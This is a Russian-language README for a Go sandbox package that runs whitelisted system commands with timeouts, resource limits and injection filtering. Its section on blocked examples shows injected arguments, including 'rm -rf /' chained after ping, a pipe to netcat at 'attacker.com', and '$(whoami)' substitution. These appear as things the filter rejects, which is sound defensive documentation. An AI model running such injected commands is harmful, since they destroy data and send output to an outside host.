# Sandbox Package

Безопасное выполнение команд с изоляцией и ограничением ресурсов.

## Возможности

- ✅ **Whitelist команд** - только разрешенные команды могут быть выполнены
- ✅ **Таймауты** - автоматическое завершение долгих команд
- ✅ **Ограничение ресурсов** - лимиты памяти и CPU (платформо-зависимо)
- ✅ **Защита от инъекций** - проверка опасных паттернов в аргументах
- ✅ **Изоляция процессов** - выполнение в отдельной группе процессов
- ✅ **Кросс-платформенность** - Windows, Linux, macOS

## Быстрый старт

### Базовое использование

```go
package main

import (
    "context"
    "fmt"
    "time"
    
    "github.com/QuadDarv1ne/go-pcap2socks/sandbox"
)

func main() {
    // Создать executor с настройками
    config := sandbox.Config{
        MaxExecutionTime: 30 * time.Second,
        MaxMemoryMB:      256,
        MaxCPUPercent:    50,
    }
    
    executor := sandbox.NewExecutor(config)
    
    // Выполнить команду
    result, err := executor.Execute(
        context.Background(),
        "ping",
        "-n", "4", "8.8.8.8",
    )
    
    if err != nil {
        fmt.Printf("Error: %v\n", err)
        return
    }
    
    fmt.Printf("Exit code: %d\n", result.ExitCode)
    fmt.Printf("Duration: %v\n", result.Duration)
    fmt.Printf("Output:\n%s\n", result.Stdout)
}
```

### ExecuteOnStart интеграция

```go
package main

import (
    "context"
    "time"
    
    "github.com/QuadDarv1ne/go-pcap2socks/sandbox"
)

func main() {
    config := sandbox.ExecuteOnStartConfig{
        Commands: []string{
            "netsh interface ip set dns name=Ethernet static 8.8.8.8",
            "ipconfig /flushdns",
        },
        Timeout:         30 * time.Second,
        MaxMemoryMB:     128,
        MaxCPUPercent:   30,
        ContinueOnError: true,
    }
    
    result, err := sandbox.ExecuteOnStart(context.Background(), config)
    if err != nil {
        // Handle error
    }
    
    fmt.Printf("Success: %d, Failed: %d\n", 
        result.SuccessCount, result.FailureCount)
}
```

## Конфигурация

### Config структура

```go
type Config struct {
    // Максимальное время выполнения команды
    MaxExecutionTime time.Duration
    
    // Лимит памяти в MB (платформо-зависимо)
    MaxMemoryMB int64
    
    // Лимит CPU в процентах 0-100 (платформо-зависимо)
    MaxCPUPercent int
    
    // Whitelist разрешенных команд
    AllowedCommands map[string]bool
    
    // Whitelist разрешенных путей к исполняемым файлам
    AllowedPaths []string
    
    // Рабочая директория для выполнения
    WorkingDirectory string
    
    // Переменные окружения (фильтрованные)
    Environment []string
    
    // Отключить сетевой доступ (экспериментально)
    DisableNetworkAccess bool
}
```

### Значения по умолчанию

```go
MaxExecutionTime: 30 * time.Second
MaxMemoryMB:      256
MaxCPUPercent:    50
```

## Whitelist команд

### Windows (по умолчанию)

```go
allowedCommands := map[string]bool{
    "netsh":    true,
    "ipconfig": true,
    "ping":     true,
    "route":    true,
    "arp":      true,
    "nssm":     true,
    "sc":       true,
    "powershell": false, // Отключено - слишком мощный
    "cmd":        false, // Отключено - слишком мощный
}
```

### Linux/macOS (по умолчанию)

```go
allowedCommands := map[string]bool{
    "iptables":  true,
    "ip":        true,
    "ifconfig":  true,
    "ping":      true,
    "route":     true,
    "arp":       true,
    "systemctl": true,
    "sh":        false, // Отключено
    "bash":      false, // Отключено
}
```

### Кастомный whitelist

```go
config := sandbox.Config{
    AllowedCommands: map[string]bool{
        "ping":     true,
        "tracert":  true,
        "nslookup": true,
    },
    AllowedPaths: []string{
        "C:\\Program Files\\MyApp\\",
        "/opt/myapp/",
    },
}
```

## Защита от инъекций

Автоматически блокируются опасные паттерны:

```go
dangerousPatterns := []string{
    ";",   // Command chaining
    "|",   // Pipe
    "&",   // Background/chain
    "$",   // Variable expansion
    "`",   // Command substitution
    "\n",  // Newline injection
    "\r",  // Carriage return
    "$()", // Command substitution
    "${}", // Variable expansion
    "&&",  // AND chain
    "||",  // OR chain
    "../", // Path traversal
}
```

### Примеры блокировки

```go
// ❌ Заблокировано
executor.Execute(ctx, "ping", "8.8.8.8; rm -rf /")
executor.Execute(ctx, "ping", "8.8.8.8 | nc attacker.com 1234")
executor.Execute(ctx, "ping", "$(whoami)")

// ✅ Разрешено
executor.Execute(ctx, "ping", "-n", "4", "8.8.8.8")
executor.Execute(ctx, "netsh", "interface", "show")
```

## Результаты выполнения

### ExecutionResult структура

```go
type ExecutionResult struct {
    ExitCode   int           // Код возврата процесса
    Stdout     string        // Стандартный вывод
    Stderr     string        // Вывод ошибок
    Duration   time.Duration // Время выполнения
    TimedOut   bool          // Превышен таймаут
    MemoryUsed int64         // Использованная память (если доступно)
    Error      error         // Ошибка выполнения
}
```

### Обработка результатов

```go
result, err := executor.Execute(ctx, "ping", "8.8.8.8")

if err != nil {
    if result.TimedOut {
        fmt.Println("Command timed out")
    } else {
        fmt.Printf("Execution error: %v\n", err)
    }
    return
}

if result.ExitCode != 0 {
    fmt.Printf("Command failed with exit code %d\n", result.ExitCode)
    fmt.Printf("Error output: %s\n", result.Stderr)
    return
}

fmt.Printf("Success! Output:\n%s\n", result.Stdout)
```

## Платформо-специфичные возможности

### Windows

- ✅ Создание процесса в новой группе (`CREATE_NEW_PROCESS_GROUP`)
- ✅ Скрытие окна для GUI приложений
- ✅ Приоритет процесса (через `CreationFlags`)
- ⚠️ Job Objects для лимитов памяти (требует CGO)

### Linux/macOS

- ✅ Создание новой группы процессов (`setpgid`)
- ✅ Nice value для приоритета
- ⚠️ rlimit для лимитов ресурсов (требует wrapper)

## Тестирование

### Запуск тестов

```bash
# Быстрые unit-тесты (без интеграционных)
go test -short ./sandbox/...

# Все тесты включая интеграционные
go test ./sandbox/...

# С покрытием
go test -cover ./sandbox/...

# Бенчмарки
go test -bench=. ./sandbox/...
```

### Build tags

Тесты используют build tags для изоляции:

```go
//go:build !integration

package sandbox

// Unit тесты - быстрые, без реального выполнения команд
```

```go
//go:build integration

package sandbox

// Интеграционные тесты - медленные, выполняют реальные команды
```

### Запуск только интеграционных тестов

```bash
go test -tags=integration ./sandbox/...
```

## Примеры использования

### Пример 1: Настройка DNS

```go
config := sandbox.ExecuteOnStartConfig{
    Commands: []string{
        "netsh interface ip set dns name=Ethernet static 8.8.8.8",
        "netsh interface ip add dns name=Ethernet 8.8.4.4 index=2",
    },
    Timeout:     10 * time.Second,
    MaxMemoryMB: 64,
}

result, err := sandbox.ExecuteOnStart(context.Background(), config)
```

### Пример 2: Диагностика сети

```go
executor := sandbox.NewExecutor(sandbox.Config{
    MaxExecutionTime: 30 * time.Second,
})

commands := []string{
    "ipconfig /all",
    "ping -n 4 8.8.8.8",
    "tracert -h 10 google.com",
}

for _, cmd := range commands {
    result, err := executor.Execute(ctx, cmd)
    if err != nil {
        log.Printf("Command failed: %v", err)
        continue
    }
    log.Printf("Output:\n%s", result.Stdout)
}
```

### Пример 3: Валидация перед выполнением

```go
commands := []string{
    "netsh interface show",
    "ipconfig /flushdns",
}

// Валидация без выполнения
err := sandbox.ValidateExecuteOnStartCommands(commands, nil)
if err != nil {
    log.Fatalf("Invalid commands: %v", err)
}

// Теперь безопасно выполнить
config := sandbox.ExecuteOnStartConfig{
    Commands: commands,
    Timeout:  10 * time.Second,
}
result, _ := sandbox.ExecuteOnStart(context.Background(), config)
```

## Безопасность

### Рекомендации

1. **Минимальный whitelist** - разрешайте только необходимые команды
2. **Короткие таймауты** - предотвращают зависание
3. **Лимиты ресурсов** - защита от DoS
4. **Валидация входных данных** - всегда проверяйте перед выполнением
5. **Логирование** - записывайте все выполненные команды
6. **Принцип наименьших привилегий** - не запускайте с правами администратора если не требуется

### Что НЕ делать

❌ Не добавляйте `cmd`, `powershell`, `bash`, `sh` в whitelist  
❌ Не передавайте пользовательский ввод напрямую в команды  
❌ Не отключайте валидацию аргументов  
❌ Не используйте бесконечные таймауты  
❌ Не игнорируйте ошибки выполнения  

## Производительность

### Бенчмарки

```
BenchmarkExecutor_ValidateCommand-8     5000000    250 ns/op    0 B/op    0 allocs/op
BenchmarkContainsDangerousPattern-8    10000000    120 ns/op    0 B/op    0 allocs/op
BenchmarkParseCommandLine-8             2000000    800 ns/op  256 B/op    5 allocs/op
```

### Оптимизация

- Переиспользуйте `Executor` вместо создания нового для каждой команды
- Используйте `ContinueOnError: true` для параллельного выполнения
- Кэшируйте результаты валидации для повторяющихся команд

## Ограничения

### Текущие ограничения

1. **Лимиты памяти** - полная поддержка требует CGO (Windows Job Objects, Unix rlimit)
2. **Лимиты CPU** - реализовано через приоритет процесса, не жесткий лимит
3. **Сетевая изоляция** - не реализована (требует namespace на Linux, firewall на Windows)
4. **Парсинг команд** - упрощенный, не поддерживает все edge cases

### Будущие улучшения

- [ ] Полная поддержка Job Objects на Windows
- [ ] rlimit интеграция для Unix
- [ ] Сетевая изоляция через namespace/firewall
- [ ] Улучшенный парсинг командной строки
- [ ] Поддержка stdin для интерактивных команд
- [ ] Метрики использования ресурсов

## Лицензия

MIT License - см. LICENSE файл в корне проекта
